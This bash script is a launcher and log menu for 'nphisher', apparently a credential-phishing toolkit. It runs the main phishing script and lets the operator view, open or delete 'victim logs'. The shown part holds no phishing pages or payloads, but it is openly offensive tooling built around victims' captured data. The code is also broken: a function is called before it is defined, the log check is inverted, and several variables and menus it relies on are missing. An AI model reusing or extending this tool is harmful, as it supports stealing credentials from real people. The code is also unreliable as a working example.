#!/bin/bash

# https://github.com/Alygnt/nphisher

##COLOUR VARIABLES

#Text
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
NC='\033[0m' #Reset colour
#Background
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" #Reset background

#Directories
pro_dir=$(pwd) #project directory
server_dir="${pro_dir}/.server" #server directory
sites_dir="${pro_dir}/.sites" #sites directory
log_name=$(date +%d-%m-%Y-%H-%M-%S)

#Variables
LINK="INVALID"

banner(){
        echo " "
        echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
        echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
        echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
        echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
        echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
        echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
        echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
        echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
        echo -e "${CYAN}        ${NC} "
}

if [[ $(uname -o) == *'Android'* ]];then
	NPHISHER_ROOT="/data/data/com.termux/files/usr/opt/nphisher"
else
	export NPHISHER_ROOT="/opt/nphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "${GREEN} To run Nphisher type \`nphisher\` in your cmd"
	echo
	echo "${BLUE} Help:"
	echo " ${YELLOW} -h | help : Print this menu & Exit"
	echo " ${YELLOW} -l | logs : View Logs"
	echo
elif [[ $1 == '-l' || $1 == 'logs' ]]; then
	logs_check
else
	cd $NPHISHER_ROOT
	bash ./nphisher.sh
fi

logs_check() {
        if [ -z "$(ls -A $DIR)" ]; then
                logs_menu
        else
		echo "No logs found"
                { sleep 1; clear; mainmenu; }
        fi
}
logs_menu() {
clear
banner
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${ORANGE} View Logs    "
echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Open Logs   "
echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Reset Logs  "
read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_menu

        case $reply_logs_menu in
                1 | 01)
                        ls logs/
                        { sleep 5; clear; logs_menu; };;
                2 | 02)
                        ls logs/
                        read -p "${RED}[${WHITE}?${RED}]${GREEN} Enter the file name without extension (.txt) : ${BLUE}"
                        if [ -f "logs/$REPLY.txt" ]; then
                                cat logs/$REPLY.txt
                        else
                                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                                { sleep 1; clear; logs_menu; }
                        fi;;
                3 | 03)
                        read -p "${RED}[${WHITE}?${RED}]${GREEN} Do you want to clear every victim logs (Y/n) : ${BLUE}"
                        case $REPLY in
                                Y | y)
                                        rm -rf logs
                                        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
                                        { sleep 1; clear; tunnelmenu; };;
                                N | n)
                                        { clear;  logs_menu; };;
			esac;;
                *)
                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; clear; logs_menu; };;
        esac
}
